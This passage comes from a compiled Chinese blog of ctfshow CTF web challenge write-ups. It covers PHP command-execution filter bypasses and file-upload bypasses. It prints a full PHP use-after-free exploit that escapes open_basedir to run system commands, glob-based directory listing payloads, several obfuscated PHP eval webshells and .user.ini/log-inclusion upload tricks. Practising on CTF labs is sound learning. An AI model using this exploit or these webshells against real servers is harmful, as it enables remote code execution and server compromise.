src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002648.gif" data="aurora"></p>\n<blockquote>\n<p>比55多过滤了数字和$ 应该对文件上传影响不大 尝试用文件上传</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530200527722" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302005771.png" data="aurora"></p>\n<h3 id="web57" tabindex="-1"><a class="header-anchor" href="#web57" aria-hidden="true">#</a> Web57</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002650.gif" data="aurora"></p>\n<blockquote>\n<p>多过滤了. 和? 所以不能像上一题用文件上传</p>\n</blockquote>\n<blockquote>\n<p>这道题表达flag在36.php 而在system函数中也有cat和.php 只需要传参c=36就行了</p>\n</blockquote>\n<blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>在Linux shell中$(())是代表数学运算   ~代表取反    举个栗子：a=1,b=2\n$a+$b就等同于$((1+2))\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002659.gif" data="aurora"></p>\n<blockquote>\n<p>一个很奇怪的点 -1取反再输出是显示的0 要得到一就要在加一个$((~$(())))</p>\n</blockquote>\n<blockquote>\n<p>所以要输出36 需要37个</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>$((~$(())))\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002671.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002039.gif" data="aurora"></p>\n<h3 id="web58" tabindex="-1"><a class="header-anchor" href="#web58" aria-hidden="true">#</a> Web58</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002184.gif" data="aurora"></p>\n<blockquote>\n<p>只能一个一个试过去</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif)</p>\n<blockquote>\n<p>直接读文件</p>\n</blockquote>\n<h3 id="web59" tabindex="-1"><a class="header-anchor" href="#web59" aria-hidden="true">#</a> Web59</h3>\n<blockquote>\n<p>跟上题一样，啥也不知道</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image020.gif)</p>\n<blockquote>\n<p>还是直接读就读出来了</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif)</p>\n<h3 id="web60" tabindex="-1"><a class="header-anchor" href="#web60" aria-hidden="true">#</a> Web60</h3>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image024.gif)</p>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif)</p>\n<h3 id="web61-62" tabindex="-1"><a class="header-anchor" href="#web61-62" aria-hidden="true">#</a> Web61 62</h3>\n<blockquote>\n<p>还是和上一题一样的</p>\n</blockquote>\n<h3 id="web66" tabindex="-1"><a class="header-anchor" href="#web66" aria-hidden="true">#</a> Web66</h3>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image028.gif)</p>\n<blockquote>\n<p>查看目录</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image030.gif)</p>\n<blockquote>\n<p>Print_r和var_dump 作用差不多可以替换</p>\n</blockquote>\n<blockquote>\n<p>2.var_dump()和print_r()的区别</p>\n</blockquote>\n<blockquote>\n<p>共同点：两者都可以打印数组，对象之类的复合型变量。</p>\n</blockquote>\n<blockquote>\n<p>区别：print_r() 只能打印一些易于理解的信息，且print_r()在打印数组时，会将把数组的指针移到最后边，使用 reset() 可让指针回到开始处。 而var_dump()不但能打印复合类型的数据，还能打印资源类型的变量。且var_dump()输出的信息则比较详细，一般调试时用得多。</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image032.gif)</p>\n<h3 id="web67" tabindex="-1"><a class="header-anchor" href="#web67" aria-hidden="true">#</a> Web67</h3>\n<blockquote>\n<p>和上一题一样</p>\n</blockquote>\n<h3 id="web68" tabindex="-1"><a class="header-anchor" href="#web68" aria-hidden="true">#</a> Web68</h3>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif)</p>\n<blockquote>\n<p>常规查目录</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif)</p>\n<blockquote>\n<p>这次禁用了show_source 和highlingt_file</p>\n</blockquote>\n<blockquote>\n<p>用include![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif)</p>\n</blockquote>\n<blockquote>\n<p>然后就RCE</p>\n</blockquote>\n<h3 id="web70" tabindex="-1"><a class="header-anchor" href="#web70" aria-hidden="true">#</a> Web70</h3>\n<blockquote>\n<p>Var_dump print_r被禁 还可以使用var_export</p>\n</blockquote>\n<blockquote>\n<p>var_export() 函数用于输出或返回一个变量，以字符串形式表示。</p>\n</blockquote>\n<blockquote>\n<p>var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530202004081" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020137.png" data="aurora"></p>\n<blockquote>\n<p>还是一样include方法做</p>\n</blockquote>\n<h3 id="web71" tabindex="-1"><a class="header-anchor" href="#web71" aria-hidden="true">#</a> Web71</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530203443557" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302034605.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020667.gif" data="aurora"></p>\n<blockquote>\n<p><a href="https://blog.csdn.net/weixin_34214500/article/details/85920870?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&amp;utm_relevant_index=2" target="_blank" rel="noopener noreferrer">PHP详解ob_clean,ob_start和ob_get_contents函数<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>这道题是先将缓冲区的内容存在s变量中，然后执行清空缓冲区可以忽略前面所有输出，再通过替换输出s变量形成看到的题目。</p>\n</blockquote>\n<blockquote>\n<p>可以用exit（）直接终端进程</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530203500613" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302035672.png" data="aurora"></p>\n<h3 id="web72" tabindex="-1"><a class="header-anchor" href="#web72" aria-hidden="true">#</a> Web72<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020669.gif" data="aurora"></h3>\n<blockquote>\n<p>无权限  用glob伪协议遍历目录 (通用版)</p>\n</blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>c=$a="glob:///*.txt";\nif($b=opendir($a)){\n\twhile(($a=readdir($b))!==false){\n\techo "filename:".$a."\\n";\n}\nclosedir($b);\n}\nexit();\n或者\nc=?>&lt;?php $a=new DirectoryIterator("glob://./*");\nforeach($a as $f)\n{echo($f->__toString().\' \');\n}\nexit(0);\n?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><blockquote>\n<p>然后利用uaf漏洞来读取</p>\n</blockquote>\n<blockquote>\n<p>看了关于uaf漏洞的笔记：<a href="https://blog.csdn.net/musilintan/article/details/116309734?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&amp;utm_relevant_index=1" target="_blank" rel="noopener noreferrer">漏洞学习笔记——UAF漏洞_孤月丶星辰的博客-CSDN博客_uaf漏洞<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>uaf绕过open_basedir执行命令\npoc（需要url编码）</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?php\n\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\nclass Vuln {\n    public $a;\n    public function __destruct() { \n        global $backtrace; \n        unset($this->a);\n        $backtrace = (new Exception)->getTrace();\n        if(!isset($backtrace[1][\'args\'])) {\n            $backtrace = debug_backtrace();\n        }\n    }\n}\n\nclass Helper {\n    public $a, $b, $c, $d;\n}\n\nfunction str2ptr(&amp;$str, $p = 0, $s = 8) {\n    $address = 0;\n    for($j = $s-1; $j >= 0; $j--) {\n        $address &lt;&lt;= 8;\n        $address |= ord($str[$p+$j]);\n    }\n    return $address;\n}\n\nfunction ptr2str($ptr, $m = 8) {\n    $out = "";\n    for ($i=0; $i &lt; $m; $i++) {\n        $out .= sprintf("%c",($ptr &amp; 0xff));\n        $ptr >>= 8;\n    }\n    return $out;\n}\n\nfunction write(&amp;$str, $p, $v, $n = 8) {\n    $i = 0;\n    for($i = 0; $i &lt; $n; $i++) {\n        $str[$p + $i] = sprintf("%c",($v &amp; 0xff));\n        $v >>= 8;\n    }\n}\n\nfunction leak($addr, $p = 0, $s = 8) {\n    global $abc, $helper;\n    write($abc, 0x68, $addr + $p - 0x10);\n    $leak = strlen($helper->a);\n    if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }\n    return $leak;\n}\n\nfunction parse_elf($base) {\n    $e_type = leak($base, 0x10, 2);\n\n​    $e_phoff = leak($base, 0x20);\n​    $e_phentsize = leak($base, 0x36, 2);\n​    $e_phnum = leak($base, 0x38, 2);\n\n​    for($i = 0; $i &lt; $e_phnum; $i++) {\n​        $header = $base + $e_phoff + $i * $e_phentsize;\n​        $p_type  = leak($header, 0, 4);\n​        $p_flags = leak($header, 4, 4);\n​        $p_vaddr = leak($header, 0x10);\n​        $p_memsz = leak($header, 0x28);\n\n​        if($p_type == 1 &amp;&amp; $p_flags == 6) { \n\n​            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n​            $data_size = $p_memsz;\n​        } else if($p_type == 1 &amp;&amp; $p_flags == 5) { \n​            $text_size = $p_memsz;\n​        }\n​    }\n\n​    if(!$data_addr || !$text_size || !$data_size)\n​        return false;\n\n​    return [$data_addr, $text_size, $data_size];\n}\n\nfunction get_basic_funcs($base, $elf) {\n    list($data_addr, $text_size, $data_size) = $elf;\n    for($i = 0; $i &lt; $data_size / 8; $i++) {\n        $leak = leak($data_addr, $i * 8);\n        if($leak - $base > 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n            $deref = leak($leak);\n            \n            if($deref != 0x746e6174736e6f63)\n                continue;\n        } else continue;\n\n​        $leak = leak($data_addr, ($i + 4) * 8);\n​        if($leak - $base > 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n​            $deref = leak($leak);\n​            \n​            if($deref != 0x786568326e6962)\n​                continue;\n​        } else continue;\n\n​        return $data_addr + $i * 8;\n​    }\n}\n\nfunction get_binary_base($binary_leak) {\n    $base = 0;\n    $start = $binary_leak &amp; 0xfffffffffffff000;\n    for($i = 0; $i &lt; 0x1000; $i++) {\n        $addr = $start - 0x1000 * $i;\n        $leak = leak($addr, 0, 7);\n        if($leak == 0x10102464c457f) {\n            return $addr;\n        }\n    }\n}\n\nfunction get_system($basic_funcs) {\n    $addr = $basic_funcs;\n    do {\n        $f_entry = leak($addr);\n        $f_name = leak($f_entry, 0, 6);\n\n​        if($f_name == 0x6d6574737973) {\n​            return leak($addr + 8);\n​        }\n​        $addr += 0x20;\n​    } while($f_entry != 0);\n​    return false;\n}\n\nfunction trigger_uaf($arg) {\n\n​    $arg = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\n​    $vuln = new Vuln();\n​    $vuln->a = $arg;\n}\n\nif(stristr(PHP_OS, \'WIN\')) {\n    die(\'This PoC is for *nix systems only.\');\n}\n\n$n_alloc = 10; \n$contiguous = [];\nfor($i = 0; $i &lt; $n_alloc; $i++)\n    $contiguous[] = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\n\ntrigger_uaf(\'x\');\n$abc = $backtrace[1][\'args\'][0];\n\n$helper = new Helper;\n$helper->b = function ($x) { };\n\nif(strlen($abc) == 79 || strlen($abc) == 0) {\n    die("UAF failed");\n}\n\n$closure_handlers = str2ptr($abc, 0);\n$php_heap = str2ptr($abc, 0x58);\n$abc_addr = $php_heap - 0xc8;\n\nwrite($abc, 0x60, 2);\nwrite($abc, 0x70, 6);\n\nwrite($abc, 0x10, $abc_addr + 0x60);\nwrite($abc, 0x18, 0xa);\n\n$closure_obj = str2ptr($abc, 0x20);\n\n$binary_leak = leak($closure_handlers, 8);\nif(!($base = get_binary_base($binary_leak))) {\n    die("Couldn\'t determine binary base address");\n}\n\nif(!($elf = parse_elf($base))) {\n    die("Couldn\'t parse ELF header");\n}\n\nif(!($basic_funcs = get_basic_funcs($base, $elf))) {\n    die("Couldn\'t get basic_functions address");\n}\n\nif(!($zif_system = get_system($basic_funcs))) {\n    die("Couldn\'t get zif_system address");\n}\n\n$fake_obj_offset = 0xd0;\nfor($i = 0; $i &lt; 0x110; $i += 8) {\n    write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n}\n\nwrite($abc, 0x20, $abc_addr + $fake_obj_offset);\nwrite($abc, 0xd0 + 0x38, 1, 4); \nwrite($abc, 0xd0 + 0x68, $zif_system); \n\n($helper->b)($cmd);\nexit();\n\n}\n\nctfshow("cat /flag0.txt");ob_end_flush();\n?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020682.gif" data="aurora"></p>\n<h3 id="web73" tabindex="-1"><a class="header-anchor" href="#web73" aria-hidden="true">#</a> Web73</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020884.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020022.gif" data="aurora"></p>\n<blockquote>\n<p>还是glob遍历</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020067.gif" data="aurora"></p>\n<p>用上脚本发现strlen被ban了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020097.gif" data="aurora"></p>\n<blockquote>\n<p>看其他师傅的wp include是没有被ban掉的 做题定向思维了 这应该是非预期解了</p>\n</blockquote>\n<h3 id="web74" tabindex="-1"><a class="header-anchor" href="#web74" aria-hidden="true">#</a> Web74</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020282.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020339.gif" data="aurora"></p>\n<blockquote>\n<p>和上一题一样</p>\n</blockquote>\n<h3 id="web75" tabindex="-1"><a class="header-anchor" href="#web75" aria-hidden="true">#</a> Web75</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020432.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020507.gif" data="aurora"></p>\n<blockquote>\n<p>这道题是用了pdo连接mysql操作方法 不是特别明白 先跳过</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web1.md",filePathRelative:"web/web1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web1.html.vue",componentFilePathRelative:"pages/web/web1.html.vue",componentFileChunkName:"v-d8e4d770",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web1.html.js",dataFilePathRelative:"pages/web/web1.html.js",dataFileChunkName:"v-d8e4d770",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web1.html",htmlFilePathRelative:"web/web1.html"},{data:{key:"v-d57b2632",path:"/web/web2.html",title:"文件上传刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"文件上传刷题",tag:["ctfshow刷题"],categories:["文件上传","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件上传",slug:"文件上传",children:[]},{level:2,title:"Web151",slug:"web151",children:[{level:3,title:"Web152",slug:"web152",children:[]},{level:3,title:"Web153",slug:"web153",children:[]},{level:3,title:"Web154",slug:"web154",children:[]},{level:3,title:"Web155",slug:"web155",children:[]},{level:3,title:"web156",slug:"web156",children:[]},{level:3,title:"web157",slug:"web157",children:[]},{level:3,title:"web158",slug:"web158",children:[]},{level:3,title:"web159",slug:"web159",children:[]},{level:3,title:"web160",slug:"web160",children:[]}]}],git:{}},key:"v-d57b2632",path:"/web/web2.html",title:"文件上传刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"文件上传刷题",tag:["ctfshow刷题"],categories:["文件上传","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件上传",slug:"文件上传",children:[]},{level:2,title:"Web151",slug:"web151",children:[{level:3,title:"Web152",slug:"web152",children:[]},{level:3,title:"Web153",slug:"web153",children:[]},{level:3,title:"Web154",slug:"web154",children:[]},{level:3,title:"Web155",slug:"web155",children:[]},{level:3,title:"web156",slug:"web156",children:[]},{level:3,title:"web157",slug:"web157",children:[]},{level:3,title:"web158",slug:"web158",children:[]},{level:3,title:"web159",slug:"web159",children:[]},{level:3,title:"web160",slug:"web160",children:[]}]}],content:'\r\n## 文件上传\r\n\r\n## Web151\r\n\r\n> （前端验证）\r\n\r\n![image1](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png)\r\n\r\n> 在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了\r\n>\r\n> 上传一个小马就能rce\r\n\r\n### Web152\r\n\r\n> (后端验证）\r\n\r\n![image3](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png)\r\n\r\n![image4](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png)\r\n\r\n> 更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。\r\n>\r\n> [Content-Type 详解_](https://blog.csdn.net/qq_14869093/article/details/86307084)\r\n>\r\n> 抓包后修改content-type 再发包就能绕过后端过滤\r\n\r\n![image5](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png)\r\n\r\n### Web153\r\n\r\n> ini文件包含绕过\r\n\r\n![image5](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png)\r\n\r\n> upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini[.user.ini漏洞](https://blog.csdn.net/weixin_52635170/article/details/126962920)\r\n\r\n> .user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。\r\n\r\n> 利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。\r\n\r\n![image8](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png)\r\n\r\n![image9](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png)\r\n\r\n> 这样index.php就包含了1.txt的马然后rce\r\n\r\n![image10](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png)\r\n\r\n> 也可以用日志文件包含做\r\n\r\n### Web154\r\n\r\n![image11](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png)\r\n\r\n> 过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签\r\n\r\n> ```\r\n> <?=eval($_POST[1]);？> <?PHP eval($_POST[1]);？>\r\n> ```\r\n>\r\n> \r\n\r\n> 没限制就继续用.user.ini漏洞写入包含文件\r\n\r\n### Web155\r\n\r\n> 同上\r\n\r\n### web156\r\n\r\n> 过滤了[]，用{}代替即可:\r\n>\r\n> ```\r\n> <?=eval($_POST{cmd});?>\r\n> ```\r\n\r\n### web157\r\n\r\n> 多过滤了分号，改一下即可：\r\n>\r\n> ```\r\n> <?=include"/var/lo"."g/nginx/access.lo"."g"?>\r\n> ```\r\n\r\n### web158\r\n\r\n> 同上\r\n\r\n### web159\r\n\r\n> 同上\r\n\r\n### web160\r\n\r\n> 本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:\r\n\r\n```\r\n<?=include"/var/lo"."g/nginx/access.lo"."g"?>\r\n<script language=\'php\'>eval($_POST[1]); <\/script>\r\n```\r\n\r\n> 这种小马在<?被过滤时用\r\n\r\n![image20](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png)\r\n\r\n> 然后上传.user.ini包含该文件即可：auto_append_file=/var/www/html/upload/hack.png\r\n\r\n> 